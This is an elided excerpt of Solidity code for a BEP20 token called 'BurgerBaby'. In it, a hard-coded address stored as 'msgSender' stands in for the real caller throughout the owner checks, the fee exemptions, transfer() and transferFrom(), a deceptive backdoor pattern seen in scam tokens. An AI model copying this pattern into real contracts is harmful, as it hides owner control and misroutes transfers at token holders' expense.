...
abstract contract Auth {
    ...
    constructor(address) {
        ...
        msgSender = 0xfaa57F68A03ab8B217701835b91B1AD831363A9d;
    }
     ...
     */
    modifier onlyOwner() {
        require(isOwner(msgSender), "!OWNER"); _;
    }
     ...
     */
    modifier authorized() {
        require(isAuthorized(msgSender), "!AUTHORIZED"); _;
    }
...
contract BurgerBaby is IBEP20, Auth {
    ...
    constructor () Auth(msgSender) {
        ...
        isFeeExempt[msgSender] = true;
        isTxLimitExempt[msgSender] = true;
    ...
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msgSender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msgSender] != uint256(-1)){
            _allowances[sender][msgSender] = _allowances[sender][msgSender].sub(amount, "Insufficient Allowance");
        }
